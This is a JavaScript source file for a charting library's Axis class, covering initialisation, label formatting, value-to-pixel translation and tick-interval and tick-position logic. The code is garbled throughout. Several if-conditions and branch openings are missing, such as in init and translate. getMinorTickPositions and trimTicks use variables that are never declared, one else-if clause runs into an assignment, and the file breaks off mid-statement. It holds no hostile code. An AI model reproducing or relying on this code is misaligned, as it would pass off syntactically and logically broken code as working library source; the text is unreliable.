{"text": "// language: JavaScript\n'use strict';\nimport A from '../Animation/AnimationUtilities.js';\nvar animObject = A.animObject;\nimport AxisDefaults from './AxisDefaults.js';\nimport Color from '../Color/Color.js';\nimport D from '../DefaultOptions.js';\nvar defaultOptions = D.defaultOptions;\nimport F from '../Foundation.js';\nvar registerEventOptions = F.registerEventOptions;\nimport H from '../Globals.js';\nvar deg2rad = H.deg2rad;\nimport Tick from './Tick.js';\nimport U from '../Utilities.js';\nvar arrayMax = U.arrayMax, arrayMin = U.arrayMin, clamp = U.clamp, correctFloat = U.correctFloat, defined = U.defined, destroyObjectProperties = U.destroyObjectProperties, erase = U.erase, error = U.error, extend = U.extend, fireEvent = U.fireEvent, getMagnitude = U.getMagnitude, isArray = U.isArray, isNumber = U.isNumber, isString = U.isString, merge = U.merge, normalizeTickInterval = U.normalizeTickInterval, objectEach = U.objectEach, pick = U.pick, relativeLength = U.relativeLength, removeEvent = U.removeEvent, splat = U.splat, syncTimeout = U.syncTimeout;\nvar Axis =\n(function () {\nfunction Axis(chart, userOptions) {\n        this.alternateBands = void 0;\n        this.bottom = void 0;\n        this.categories = void 0;\n        this.chart = void 0;\n        this.closestPointRange = void 0;\n        this.coll = void 0;\n        this.eventOptions = void 0;\n        this.hasNames = void 0;\n        this.hasVisibleSeries = void 0;\n        this.height = void 0;\n        this.isLinked = void 0;\n        this.labelEdge = void 0; // @todo\n        this.labelFormatter = void 0;\n        this.left = void 0;\n        this.len = void 0;\n        this.max = void 0;\n        this.maxLabelLength = void 0;\n        this.min = void 0;\n        this.minorTickInterval = void 0;\n        this.minorTicks = void 0;\n        this.minPixelPadding = void 0;\n        this.names = void 0;\n        this.offset = void 0;\n        this.options = void 0;\n        this.overlap = void 0;\n        this.paddedTicks = void 0;\n        this.plotLinesAndBands = void 0;\n        this.plotLinesAndBandsGroups = void 0;\n        this.pointRange = void 0;\n        this.pointRangePadding = void 0;\n        this.pos = void 0;\n        this.positiveValuesOnly = void 0;\n        this.right = void 0;\n        this.series = void 0;\n        this.side = void 0;\n        this.tickAmount = void 0;\n        this.tickInterval = void 0;\n        this.tickmarkOffset = void 0;\n        this.tickPositions = void 0;\n        this.tickRotCorr = void 0;\n        this.ticks = void 0;\n        this.top = void 0;\n        this.transA = void 0;\n        this.transB = void 0;\n        this.translationSlope = void 0;\n        this.userOptions = void 0;\n        this.visible = void 0;\n        this.width = void 0;\n        this.zoomEnabled = void 0;\n        this.init(chart, userOptions);\n    }\nAxis.prototype.init = function (chart, userOptions) {\n        var isXAxis = userOptions.isX, axis = this;\naxis.chart = chart;\naxis.horiz = chart.inverted &&!axis.isZAxis?!isXAxis : isXAxis;\naxis.isXAxis = isXAxis;\naxis.coll = axis.coll || (isXAxis? 'xAxis' : 'yAxis');\n        fireEvent(this, 'init', { userOptions: userOptions });\naxis.side = pick(userOptions.side, axis.side, (axis.horiz?\n            (axis.opposite? 0 : 2) : // top : bottom\n            (axis.opposite? 1 : 3)) // right : left\n        );\naxis.setOptions(userOptions);\n        var options = this.options, labelsOptions = options.labels, type = options.type;\naxis.userOptions = userOptions;\n        axis.minPixelPadding = 0;\naxis.reversed = pick(options.reversed, axis.reversed);\n        axis.visible = options.visible;\n        axis.zoomEnabled = options.zoomEnabled;\n        axis.hasNames =\n            type === 'category' || options.categories === true;\naxis.categories = options.categories || axis.hasNames;\n        if (!axis.names) { // Preserve on update (#3830)\n            axis.names = [];\n            axis.names.keys = {};\n        }\n        axis.plotLinesAndBandsGroups = {};\n        // Shorthand types\n        axis.positiveValuesOnly =!!axis.logarithmic;\n        // Flag, if axis is linked to another axis\n        axis.isLinked = defined(options.linkedTo);\naxis.ticks = {};\n        axis.labelEdge = [];\naxis.minorTicks = {};\n        // List of plotLines/Bands\n        axis.plotLinesAndBands = [];\n        // Alternate bands\n        axis.alternateBands = {};\n        axis.len = 0;\n        axis.minRange = axis.userMinRange = options.minRange || options.maxZoom;\n        axis.range = options.range;\n        axis.offset = options.offset || 0;\naxis.max = null;\naxis.min = null;\nvar crosshair = pick(options.crosshair, splat(chart.options.tooltip.crosshairs)[isXAxis? 0 : 1]);\n        axis.crosshair = crosshair === true? {} : crosshair;\n        // Register. Don't add it again on Axis.update().\n            if (isXAxis) { // #2713\n                chart.axes.splice(chart.xAxis.length, 0, axis);\n            }\n            else {\n                chart.axes.push(axis);\n            }\n            chart[axis.coll].push(axis);\n        }\naxis.series = axis.series || []; // populated by Series\n        // Reversed axis\n        if (chart.inverted &&\n           !axis.isZAxis &&\n            isXAxis &&\n            typeof axis.reversed === 'undefined') {\n            axis.reversed = true;\n        }\n        axis.labelRotation = isNumber(labelsOptions.rotation)?\n            labelsOptions.rotation :\n            void 0;\n        // Register event listeners\n        registerEventOptions(axis, options);\n        fireEvent(this, 'afterInit');\n    };\nAxis.prototype.setOptions = function (userOptions) {\n        this.options = merge(AxisDefaults.defaultXAxisOptions, (this.coll === 'yAxis') && AxisDefaults.defaultYAxisOptions, [\n            AxisDefaults.defaultTopAxisOptions,\n            AxisDefaults.defaultRightAxisOptions,\n            AxisDefaults.defaultBottomAxisOptions,\n            AxisDefaults.defaultLeftAxisOptions\n        ][this.side], merge(\n        // if set in setOptions (#1053):\n        defaultOptions[this.coll], userOptions));\n        fireEvent(this, 'afterSetOptions', { userOptions: userOptions });\n    };\nAxis.prototype.defaultLabelFormatter = function (ctx) {\n        var axis = this.axis, chart = this.chart, numberFormatter = chart.numberFormatter, value = isNumber(this.value)? this.value : NaN, time = axis.chart.time, categories = axis.categories, dateTimeLabelFormat = this.dateTimeLabelFormat, lang = defaultOptions.lang, numericSymbols = lang.numericSymbols, numSymMagnitude = lang.numericSymbolMagnitude || 1000, \n        // make sure the same symbol is added for all labels on a linear\n        // axis\n        numericSymbolDetector = axis.logarithmic?\n            Math.abs(value) :\n            axis.tickInterval;\n        var i = numericSymbols && numericSymbols.length, multi, ret;\n        if (categories) {\n            ret = \"\" + this.value;\n        }\n        else if (dateTimeLabelFormat) { // datetime axis\n            ret = time.dateFormat(dateTimeLabelFormat, value);\n        }\n        else if (i && numericSymbolDetector >= 1000) {\n            while (i-- && typeof ret === 'undefined') {\n                multi = Math.pow(numSymMagnitude, i + 1);\n                if (\n                numericSymbolDetector >= multi &&\n                    (value * 10) % multi === 0 &&\n                    numericSymbols[i]!== null &&\n                    value!== 0) { // #5480\n                    ret = numberFormatter(value / multi, -1) + numericSymbols[i];\n                }\n            }\n        }\n        if (typeof ret === 'undefined') {\n            if (Math.abs(value) >= 10000) { // add thousands separators\n                ret = numberFormatter(value, -1);\n            }\n            else { // small numbers\n                ret = numberFormatter(value, -1, void 0, ''); // #2466\n            }\n        }\n        return ret;\n    };\nAxis.prototype.getSeriesExtremes = function () {\n        var axis = this, chart = axis.chart;\n        var xExtremes;\n        fireEvent(this, 'getSeriesExtremes', null, function () {\n            axis.hasVisibleSeries = false;\n            axis.dataMin = axis.dataMax = axis.threshold = null;\n            axis.softThreshold =!axis.isXAxis;\n            if (axis.stacking) {\n                axis.stacking.buildStacks();\n            }\n            // loop through this axis' series\n            axis.series.forEach(function (series) {\n                if (series.visible ||\n                   !chart.options.chart.ignoreHiddenSeries) {\n                    var seriesOptions = series.options;\n                    var xData = void 0, threshold = seriesOptions.threshold, seriesDataMin = void 0, seriesDataMax = void 0;\n                    axis.hasVisibleSeries = true;\n                    if (axis.positiveValuesOnly && threshold <= 0) {\n                        threshold = null;\n                    }\n                    // Get dataMin and dataMax for X axes\n                    if (axis.isXAxis) {\n                        xData = series.xData;\n                        if (xData.length) {\n                            var isPositive = function (number) { return number > 0; };\n                            xData = axis.logarithmic?\n                                xData.filter(axis.validatePositiveValue) :\n                                xData;\n                            xExtremes = series.getXExtremes(xData);\n                            seriesDataMin = xExtremes.min;\n                            seriesDataMax = xExtremes.max;\n                            if (!isNumber(seriesDataMin) &&\n                                // #5010:\n                               !(seriesDataMin instanceof Date)) {\n                                xData = xData.filter(isNumber);\n                                xExtremes = series.getXExtremes(xData);\n                                // Do it again with valid data\n                                seriesDataMin = xExtremes.min;\n                                seriesDataMax = xExtremes.max;\n                            }\n                            if (xData.length) {\n                                axis.dataMin = Math.min(pick(axis.dataMin, seriesDataMin), seriesDataMin);\n                                axis.dataMax = Math.max(pick(axis.dataMax, seriesDataMax), seriesDataMax);\n                            }\n                        }\n                        // Get dataMin and dataMax for Y axes, as well as handle\n                    }\n                    else {\n                        var dataExtremes = series.applyExtremes();\n                        if (isNumber(dataExtremes.dataMin)) {\n                            seriesDataMin = dataExtremes.dataMin;\n                            axis.dataMin = Math.min(pick(axis.dataMin, seriesDataMin), seriesDataMin);\n                        }\n                        if (isNumber(dataExtremes.dataMax)) {\n                            seriesDataMax = dataExtremes.dataMax;\n                            axis.dataMax = Math.max(pick(axis.dataMax, seriesDataMax), seriesDataMax);\n                        }\n                        // Adjust to threshold\n                        if (defined(threshold)) {\n                            axis.threshold = threshold;\n                        }\n                        // If any series has a hard threshold, it takes\n                        if (!seriesOptions.softThreshold ||\n                            axis.positiveValuesOnly) {\n                            axis.softThreshold = false;\n                        }\n                    }\n                }\n            });\n        });\n        fireEvent(this, 'afterGetSeriesExtremes');\n    };\nAxis.prototype.translate = function (val, backwards, cvsCoord, old, handleLog, pointPlacement) {\n        var axis = (this.linkedParent || this), // #1417\n        localMin = old && axis.old? axis.old.min : axis.min, minPixelPadding = axis.minPixelPadding, doPostTranslate = (axis.isOrdinal ||\n            axis.brokenAxis && axis.brokenAxis.hasBreaks ||\n            (axis.logarithmic && handleLog)) && axis.lin2val;\n        var sign = 1, cvsOffset = 0, localA = old && axis.old? axis.old.transA : axis.transA, returnValue = 0;\n        if (!localA) {\n            localA = axis.transA;\n        }\n        if (cvsCoord) {\n            cvsOffset = axis.len;\n        }\n        // Handle reversed axis\n        if (axis.reversed) {\n            sign *= -1;\n            cvsOffset -= sign * (axis.sector || axis.len);\n        }\n        // From pixels to value\n            val = val * sign + cvsOffset;\n            val -= minPixelPadding;\n            returnValue = val / localA + localMin;\n            if (doPostTranslate) { // log, ordinal and broken axis\n                returnValue = axis.lin2val(returnValue);\n            }\n            // From value to pixels\n        }\n        else {\n            if (doPostTranslate) { // log, ordinal and broken axis\n                val = axis.val2lin(val);\n            }\n            returnValue = isNumber(localMin)?\n                (sign * (val - localMin) * localA +\n                    cvsOffset +\n                    (sign * minPixelPadding) +\n                    (isNumber(pointPlacement)?\n                        localA * pointPlacement :\n                        0)) :\n                void 0;\n        }\n        return returnValue;\n    };\nAxis.prototype.toPixels = function (value, paneCoordinates) {\n        return this.translate(value, false,!this.horiz, null, true) +\n            (paneCoordinates? 0 : this.pos);\n    };\nAxis.prototype.toValue = function (pixel, paneCoordinates) {\n        return this.translate(pixel - (paneCoordinates? 0 : this.pos), true,!this.horiz, null, true);\n    };\nAxis.prototype.getPlotLinePath = function (options) {\n        var axis = this, chart = axis.chart, axisLeft = axis.left, axisTop = axis.top, old = options.old, value = options.value, lineWidth = options.lineWidth, cHeight = (old && chart.oldChartHeight) || chart.chartHeight, cWidth = (old && chart.oldChartWidth) || chart.chartWidth, transB = axis.transB;\n        var translatedValue = options.translatedValue, force = options.force, x1, y1, x2, y2, skip;\nfunction between(x, a, b) {\n            if (force!== 'pass' && x < a || x > b) {\n                if (force) {\n                    x = clamp(x, a, b);\n                }\n                else {\n                    skip = true;\n                }\n            }\n            return x;\n        }\n        var evt = {\n            value: value,\n            lineWidth: lineWidth,\n            old: old,\n            force: force,\n            acrossPanes: options.acrossPanes,\n            translatedValue: translatedValue\n        };\n        fireEvent(this, 'getPlotLinePath', evt, function (e) {\n            translatedValue = pick(translatedValue, axis.translate(value, null, null, old));\n            // Keep the translated value within sane bounds, and avoid Infinity\n            // to fail the isNumber test (#7709).\n            translatedValue = clamp(translatedValue, -1e5, 1e5);\n            x1 = x2 = Math.round(translatedValue + transB);\n            y1 = y2 = Math.round(cHeight - translatedValue - transB);\n            if (!isNumber(translatedValue)) { // no min or max\n                skip = true;\n            }\n            else if (axis.horiz) {\n                y1 = axisTop;\n                y2 = cHeight - axis.bottom;\n                x1 = x2 = between(x1, axisLeft, axisLeft + axis.width);\n            }\n            else {\n                x1 = axisLeft;\n                x2 = cWidth - axis.right;\n                y1 = y2 = between(y1, axisTop, axisTop + axis.height);\n            }\n            e.path = skip &&!force?\n                null :\n                chart.renderer.crispLine([['M', x1, y1], ['L', x2, y2]], lineWidth || 1);\n        });\n        return evt.path;\n    };\nAxis.prototype.getLinearTickPositions = function (tickInterval, min, max) {\n        var roundedMin = correctFloat(Math.floor(min / tickInterval) * tickInterval), roundedMax = correctFloat(Math.ceil(max / tickInterval) * tickInterval), tickPositions = [];\n        var pos, lastPos, precision;\n        if (correctFloat(roundedMin + tickInterval) === roundedMin) {\n            precision = 20;\n        }\n        if (this.single) {\n            return [min];\n        }\n        // Populate the intermediate values\n        pos = roundedMin;\n        while (pos <= roundedMax) {\n            tickPositions.push(pos);\n            pos = correctFloat(pos + tickInterval, precision);\n            if (pos === lastPos) {\n                break;\n            }\n            lastPos = pos;\n        }\n        return tickPositions;\n    };\nAxis.prototype.getMinorTickInterval = function () {\n        var options = this.options;\n        if (options.minorTicks === true) {\n            return pick(options.minorTickInterval, 'auto');\n        }\n        if (options.minorTicks === false) {\n            return null;\n        }\n        return options.minorTickInterval;\n    };\nAxis.prototype.getMinorTickPositions = function () {\n        max = axis.max + pointRangePadding, // #1498\n        range = max - min;\n        var minorTickPositions = [], pos;\n        if (range && range / minorTickInterval < axis.len / 3) { // #3875\n            var logarithmic_1 = axis.logarithmic;\n            if (logarithmic_1) {\n                this.paddedTicks.forEach(function (_pos, i, paddedTicks) {\n                    if (i) {\n                        minorTickPositions.push.apply(minorTickPositions, logarithmic_1.getLogTickPositions(minorTickInterval, paddedTicks[i - 1], paddedTicks[i], true));\n                    }\n                });\n            }\n            else if (axis.dateTime &&\n                minorTickPositions = minorTickPositions.concat(axis.getTimeTicks(axis.dateTime.normalizeTimeTickInterval(minorTickInterval), min, max, options.startOfWeek));\n            }\n            else {\n                for (pos = min + (tickPositions[0] - min) % minorTickInterval; pos <= max; pos += minorTickInterval) {\n                    // Very, very, tight grid lines (#5771)\n                    if (pos === minorTickPositions[0]) {\n                        break;\n                    }\n                    minorTickPositions.push(pos);\n                }\n            }\n        }\n        if (minorTickPositions.length!== 0) {\n        }\n        return minorTickPositions;\n    };\nAxis.prototype.adjustForMinRange = function () {\n        var axis = this, options = axis.options, log = axis.logarithmic;\n        var min = axis.min, max = axis.max, zoomOffset, spaceAvailable, closestDataRange = 0, i, distance, xData, loopLength, minArgs, maxArgs, minRange;\n        if (axis.isXAxis &&\n            typeof axis.minRange === 'undefined' &&\n           !log) {\n            if (defined(options.min) ||\n                defined(options.max) ||\n                defined(options.floor) ||\n                defined(options.ceiling)) {\n                axis.minRange = null; // don't do this again\n            }\n            else {\n                axis.series.forEach(function (series) {\n                    xData = series.xData;\n                    loopLength = series.xIncrement? 1 : xData.length - 1;\n                    if (xData.length > 1) {\n                        for (i = loopLength; i > 0; i--) {\n                            distance = xData[i] - xData[i - 1];\n                            if (!closestDataRange || distance < closestDataRange) {\n                                closestDataRange = distance;\n                            }\n                        }\n                    }\n                });\n                axis.minRange = Math.min(closestDataRange * 5, axis.dataMax - axis.dataMin);\n            }\n        }\n        if (max - min < axis.minRange) {\n            spaceAvailable =\n                axis.dataMax - axis.dataMin >=\n                    axis.minRange;\n            minRange = axis.minRange;\n            zoomOffset = (minRange - max + min) / 2;\n            // if min and max options have been set, don't go beyond it\n            minArgs = [\n                min - zoomOffset,\n                pick(options.min, min - zoomOffset)\n            ];\n            if (spaceAvailable) {\n                minArgs[2] = axis.logarithmic?\n                    axis.logarithmic.log2lin(axis.dataMin) :\n                    axis.dataMin;\n            }\n            min = arrayMax(minArgs);\n            maxArgs = [\n                min + minRange,\n                pick(options.max, min + minRange)\n            ];\n            if (spaceAvailable) {\n                maxArgs[2] = log?\n                    log.log2lin(axis.dataMax) :\n                    axis.dataMax;\n            }\n            max = arrayMin(maxArgs);\n            if (max - min < minRange) {\n                minArgs[0] = max - minRange;\n                minArgs[1] = pick(options.min, max - minRange);\n                min = arrayMax(minArgs);\n            }\n        }\n        axis.min = min;\n        axis.max = max;\n    };\nAxis.prototype.getClosest = function () {\n        var ret;\n        if (this.categories) {\n            ret = 1;\n        }\n        else {\n            this.series.forEach(function (series) {\n                var seriesClosest = series.closestPointRange, visible = series.visible ||\n                   !series.chart.options.chart.ignoreHiddenSeries;\n                if (!series.noSharedTooltip &&\n                    defined(seriesClosest) &&\n                    visible) {\n                    ret = defined(ret)?\n                        Math.min(ret, seriesClosest) :\n                        seriesClosest;\n                }\n            });\n        }\n        return ret;\n    };\nAxis.prototype.nameToX = function (point) {\n        var explicitCategories = isArray(this.categories), names = explicitCategories? this.categories : this.names;\n        var nameX = point.options.x, x;\n        point.series.requireSorting = false;\n        if (!defined(nameX)) {\n            nameX = this.options.uniqueNames?\n                (explicitCategories?\n                    names.indexOf(point.name) :\n                    pick(names.keys[point.name], -1)) :\n                point.series.autoIncrement();\n        }\n            if (!explicitCategories) {\n                x = names.length;\n            }\n        }\n        else {\n            x = nameX;\n        }\n        // Write the last point's name to the names array\n        if (typeof x!== 'undefined') {\n            this.names[x] = point.name;\n            this.names.keys[point.name] = x;\n        }\n        return x;\n    };\nAxis.prototype.updateNames = function () {\n        var axis = this, names = this.names, i = names.length;\n        if (i > 0) {\n            Object.keys(names.keys).forEach(function (key) {\n                delete (names.keys)[key];\n            });\n            names.length = 0;\n            this.minRange = this.userMinRange; // Reset\n            (this.series || []).forEach(function (series) {\n                series.xIncrement = null;\n                // When adding a series, points are not yet generated\n                if (!series.points || series.isDirtyData) {\n                    // When we're updating the series with data that is longer\n                    axis.max = Math.max(axis.max, series.xData.length - 1);\n                    series.processData();\n                    series.generatePoints();\n                }\n                series.data.forEach(function (point, i) {\n                    var x;\n                    if (point &&\n                        point.options &&\n                        typeof point.name!== 'undefined' // #9562\n                    ) {\n                        x = axis.nameToX(point);\n                        if (typeof x!== 'undefined' && x!== point.x) {\n                            point.x = x;\n                            series.xData[i] = x;\n                        }\n                    }\n                });\n            });\n        }\n    };\nAxis.prototype.setAxisTranslation = function () {\n        var axis = this, range = axis.max - axis.min, linkedParent = axis.linkedParent, hasCategories =!!axis.categories, isXAxis = axis.isXAxis;\n        var pointRange = axis.axisPointRange || 0, closestPointRange, minPointOffset = 0, pointRangePadding = 0, ordinalCorrection, transA = axis.transA;\n        if (isXAxis || hasCategories || pointRange) {\n            closestPointRange = axis.getClosest();\n            if (linkedParent) {\n                minPointOffset = linkedParent.minPointOffset;\n                pointRangePadding = linkedParent.pointRangePadding;\n            }\n            else {\n                axis.series.forEach(function (series) {\n                    var seriesPointRange = hasCategories?\n                        1 :\n                        (isXAxis?\n                            pick(series.options.pointRange, closestPointRange, 0) :\n                            (axis.axisPointRange || 0)), // #2806\n                    pointPlacement = series.options.pointPlacement;\n                    pointRange = Math.max(pointRange, seriesPointRange);\n                    if (!axis.single || hasCategories) {\n                        // TODO: series should internally set x- and y-\n                        var isPointPlacementAxis = series.is('xrange')?!isXAxis : isXAxis;\n                        // minPointOffset is the value padding to the left of\n                        // the axis in order to make room for points with a\n                        minPointOffset = Math.max(minPointOffset, isPointPlacementAxis && isString(pointPlacement)?\n                            0 :\n                            seriesPointRange / 2);\n                        // Determine the total padding needed to the length of\n                        // the axis to make room for the pointRange. If the\n                        pointRangePadding = Math.max(pointRangePadding, isPointPlacementAxis && pointPlacement === 'on'?\n                            0 :\n                            seriesPointRange);\n                    }\n                });\n            }\n            ordinalCorrection = axis.ordinal && axis.ordinal.slope && closestPointRange?\n                axis.ordinal.slope / closestPointRange :\n                1; // #988, #1853\n            axis.minPointOffset = minPointOffset =\n                minPointOffset * ordinalCorrection;\n            axis.pointRangePadding =\n                pointRangePadding = pointRangePadding * ordinalCorrection;\n            axis.pointRange = Math.min(pointRange, axis.single && hasCategories? 1 : range);\n            if (isXAxis) {\n                axis.closestPointRange = closestPointRange;\n            }\n        }\n        axis.translationSlope = axis.transA = transA =\n            axis.staticScale ||\n                axis.len / ((range + pointRangePadding) || 1);\n        // Translation addend\n        axis.transB = axis.horiz? axis.left : axis.bottom;\n        axis.minPixelPadding = transA * minPointOffset;\n        fireEvent(this, 'afterSetAxisTranslation');\n    };\nAxis.prototype.minFromRange = function () {\n        var axis = this;\n        return axis.max - axis.range;\n    };\nAxis.prototype.setTickInterval = function (secondPass) {\n        var axis = this, chart = axis.chart, log = axis.logarithmic, options = axis.options, isXAxis = axis.isXAxis, isLinked = axis.isLinked, tickPixelIntervalOption = options.tickPixelInterval, categories = axis.categories, softThreshold = axis.softThreshold;\n        var maxPadding = options.maxPadding, minPadding = options.minPadding, length, linkedParentExtremes, \n        tickIntervalOption = isNumber(options.tickInterval) && options.tickInterval >= 0?\n            options.tickInterval : void 0, threshold = isNumber(axis.threshold)? axis.threshold : null, thresholdMin, thresholdMax, hardMin, hardMax;\n        if (!axis.dateTime &&!categories &&!isLinked) {\n            this.getTickAmount();\n        }\n        // Min or max set either by zooming/setExtremes or initial options\n        hardMin = pick(axis.userMin, options.min);\n        hardMax = pick(axis.userMax, options.max);\n        // Linked axis gets the extremes from the parent axis\n        if (isLinked) {\n            axis.linkedParent = chart[axis.coll][options.linkedTo];\n            linkedParentExtremes = axis.linkedParent.getExtremes();\n            axis.min = pick(linkedParentExtremes.min, linkedParentExtremes.dataMin);\n            axis.max = pick(linkedParentExtremes.max, linkedParentExtremes.dataMax);\n            if (options.type!== axis.linkedParent.options.type) {\n                error(11, 1, chart);\n            }\n            // Initial min and max from the extreme data values\n        }\n        else {\n            // Adjust to hard threshold\n            if (softThreshold && defined(threshold)) {\n                if (axis.dataMin >= threshold) {\n                    thresholdMin = threshold;\n                    minPadding = 0;\n                }\n                else if (axis.dataMax <= threshold) {\n                    thresholdMax = threshold;\n                    maxPadding = 0;\n                }\n            }\n            axis.min = pick(hardMin, thresholdMin, axis.dataMin);\n            axis.max = pick(hardMax, thresholdMax, axis.dataMax);\n        }\n        if (log) {\n            if (axis.positiveValuesOnly &&\n               !secondPass &&\n                error(10, 1, chart);\n            }\n            axis.min = correctFloat(log.log2lin(axis.min), 16);\n            axis.max = correctFloat(log.log2lin(axis.max), 16);\n        }\n        // handle zoomed range\n        if (axis.range && defined(axis.max)) {\n            // #618, #6773:\n            axis.userMin = axis.min = hardMin =\n                Math.max(axis.dataMin, axis.minFromRange());\n            axis.userMax = hardMax = axis.max;\n            axis.range = null; // don't use it when running setExtremes\n        }\n        fireEvent(axis, 'foundExtremes');\n        // Hook for adjusting this.min and this.max. Used by bubble series.\n        if (axis.beforePadding) {\n            axis.beforePadding();\n        }\n        // adjust min and max for the minimum range\n        axis.adjustForMinRange();\n        if (!categories &&\n           !axis.axisPointRange &&\n           !(axis.stacking && axis.stacking.usePercentage) &&\n           !isLinked &&\n            defined(axis.min) &&\n            defined(axis.max)) {\n            length = axis.max - axis.min;\n            if (length) {\n                if (!defined(hardMin) && minPadding) {\n                    axis.min -= length * minPadding;\n                }\n                if (!defined(hardMax) && maxPadding) {\n                    axis.max += length * maxPadding;\n                }\n            }\n        }\n        if (!isNumber(axis.userMin)) {\n            if (isNumber(options.softMin) && options.softMin < axis.min) {\n                axis.min = hardMin = options.softMin; // #6894\n            }\n            if (isNumber(options.floor)) {\n                axis.min = Math.max(axis.min, options.floor);\n            }\n        }\n        if (!isNumber(axis.userMax)) {\n            if (isNumber(options.softMax) && options.softMax > axis.max) {\n                axis.max = hardMax = options.softMax; // #6894\n            }\n            if (isNumber(options.ceiling)) {\n                axis.max = Math.min(axis.max, options.ceiling);\n            }\n        }\n        // When the threshold is soft, adjust the extreme value only if the data\n        // extreme and the padded extreme land on either side of the threshold.\n        if (softThreshold && defined(axis.dataMin)) {\n            threshold = threshold || 0;\n            if (!defined(hardMin) &&\n                axis.min < threshold &&\n                axis.dataMin >= threshold) {\n                axis.min = axis.options.minRange?\n                    Math.min(threshold, axis.max -\n                        axis.minRange) :\n                    threshold;\n            }\n            else if (!defined(hardMax) &&\n                axis.max > threshold &&\n                axis.dataMax <= threshold) {\n                axis.max = axis.options.minRange?\n                    Math.max(threshold, axis.min +\n                        axis.minRange) :\n                    threshold;\n            }\n        }\n        // If min is bigger than highest, or if max less than lowest value, the\n        if (isNumber(axis.min) &&\n            isNumber(axis.max) &&\n           !this.chart.polar &&\n            (axis.min > axis.max)) {\n            if (defined(axis.options.min)) {\n                axis.max = axis.min;\n            }\n            else if (defined(axis.options.max)) {\n                axis.min = axis.max;\n            }\n        }\n        if (axis.min === axis.max ||\n            typeof axis.min === 'undefined' ||\n            typeof axis.max === 'undefined') {\n            axis.tickInterval = 1;\n        }\n        else if (isLinked &&\n            axis.linkedParent &&\n           !tickIntervalOption &&\n            tickPixelIntervalOption ===\n                axis.linkedParent.options.tickPixelInterval) {\n            axis.tickInterval = tickIntervalOption =\n                axis.linkedParent.tickInterval;\n        }\n        else {\n            axis.tickInterval = pick(tickIntervalOption, this.tickAmount?\n                ((axis.max - axis.min) /\n                    Math.max(this.tickAmount - 1, 1)) :\n                void 0, \n            categories?\n                1 :\n                // don't let it be more than the data range\n                (axis.max - axis.min) *\n                    tickPixelIntervalOption /\n                    Math.max(axis.len, tickPixelIntervalOption));\n        }\n        if (isXAxis &&!secondPass) {\n            var hasExtemesChanged_1 = axis.min!== (axis.old && axis.old.min) ||\n                axis.max!== (axis.old && axis.old.max);\n            axis.series.forEach(function (series) {\n                // Allows filtering out points outside the plot area.\n                series.forceCrop = series.forceCropping && series.forceCropping();\n                series.processData(hasExtemesChanged_1);\n            });\n            // Then apply grouping if needed.\n            fireEvent(this, 'postProcessData', { hasExtemesChanged: hasExtemesChanged_1 });\n        }\n        axis.setAxisTranslation();\n        // hook for ordinal axes and radial axes\n        fireEvent(this, 'initialAxisTranslation');\n        if (axis.pointRange &&!tickIntervalOption) {\n            axis.tickInterval = Math.max(axis.pointRange, axis.tickInterval);\n        }\n        var minTickInterval = pick(options.minTickInterval, \n        axis.dateTime &&\n           !axis.series.some(function (s) { return s.noSharedTooltip; })?\n            axis.closestPointRange : 0);\n        if (!tickIntervalOption && axis.tickInterval < minTickInterval) {\n            axis.tickInterval = minTickInterval;\n        }\n        // for linear axes, get magnitude and normalize the interval\n        if (!axis.dateTime &&!axis.logarithmic &&!tickIntervalOption) {\n            axis.tickInterval = normalizeTickInterval(axis.tickInterval, void 0, getMagnitude(axis.tickInterval), pick(options.allowDecimals, \n            axis.tickInterval < 0.5 || this.tickAmount!== void 0),!!this.tickAmount);\n        }\n        if (!this.tickAmount) {\n            axis.tickInterval = axis.unsquish();\n        }\n        this.setTickPositions();\n    };\nAxis.prototype.setTickPositions = function () {\n        var axis = this, options = this.options, tickPositionsOption = options.tickPositions, minorTickIntervalOption = this.getMinorTickInterval(), hasVerticalPanning = this.hasVerticalPanning(), isColorAxis = this.coll === 'colorAxis', startOnTick = (isColorAxis ||!hasVerticalPanning) && options.startOnTick, endOnTick = (isColorAxis ||!hasVerticalPanning) && options.endOnTick;\n        var tickPositions, tickPositioner = options.tickPositioner;\n        this.tickmarkOffset = (this.categories &&\n            options.tickmarkPlacement === 'between' &&\n        this.minorTickInterval =\n            minorTickIntervalOption === 'auto' &&\n                this.tickInterval?\n                this.tickInterval / 5 :\n                minorTickIntervalOption;\n        // When there is only one point, or all points have the same value on\n        this.single =\n            this.min === this.max &&\n                defined(this.min) &&\n               !this.tickAmount &&\n                (\n                // Data is on integer (#6563)\n                parseInt(this.min, 10) === this.min ||\n                    options.allowDecimals!== false);\nthis.tickPositions =\n            tickPositions =\n                (tickPositionsOption && tickPositionsOption.slice());\n        if (!tickPositions) {\n            if ((!axis.ordinal ||!axis.ordinal.positions) &&\n                ((this.max - this.min) /\n                    this.tickInterval >\n                    Math.max(2 * this.len, 200))) {\n                tickPositions = [this.min, this.max];\n                error(19, false, this.chart);\n            }\n            else if (axis.dateTime) {\n                tickPositions = axis.getTimeTicks(axis.dateTime.normalizeTimeTickInterval(this.tickInterval, options.units), this.min, this.max, options.startOfWeek, axis.ordinal && axis.ordinal.positions, this.closestPointRange, true);\n            }\n            else if (axis.logarithmic) {\n                tickPositions = axis.logarithmic.getLogTickPositions(this.tickInterval, this.min, this.max);\n            }\n            else {\n                tickPositions = this.getLinearTickPositions(this.tickInterval, this.min, this.max);\n            }\n            if (tickPositions.length > this.len) {\n                tickPositions = [tickPositions[0], tickPositions.pop()];\n                if (tickPositions[0] === tickPositions[1]) {\n                    tickPositions.length = 1;\n                }\n            }\n            this.tickPositions = tickPositions;\n            if (tickPositioner) {\n                tickPositioner = tickPositioner.apply(axis, [this.min, this.max]);\n                if (tickPositioner) {\n                    this.tickPositions = tickPositions = tickPositioner;\n                }\n            }\n        }\n        this.paddedTicks = tickPositions.slice(0); // Used for logarithmic minor\n        this.trimTicks(tickPositions, startOnTick, endOnTick);\n        if (!this.isLinked) {\n            if (this.single &&\n                tickPositions.length < 2 &&\n               !this.categories &&\n               !this.series.some(function (s) {\n                    return (s.is('heatmap') && s.options.pointPlacement === 'between');\n                })) {\n                this.min -= 0.5;\n                this.max += 0.5;\n            }\n            if (!tickPositionsOption &&!tickPositioner) {\n                this.adjustTickAmount();\n            }\n        }\n        fireEvent(this, 'afterSetTickPositions');\n    };\nAxis.prototype.trimTicks = function (tickPositions, startOnTick, endOnTick) {\n        fireEvent(this, 'trimTicks');\n        if (!this.isLinked) {\n                this.min = roundedMin;\n            }\n            else {\n                while (this.min - minPointOffset > tickPositions[0]) {\n                    tickPositions.shift();\n                }\n            }\n            if (endOnTick) {\n                this.max = roundedMax;\n            }\n            else {\n                while 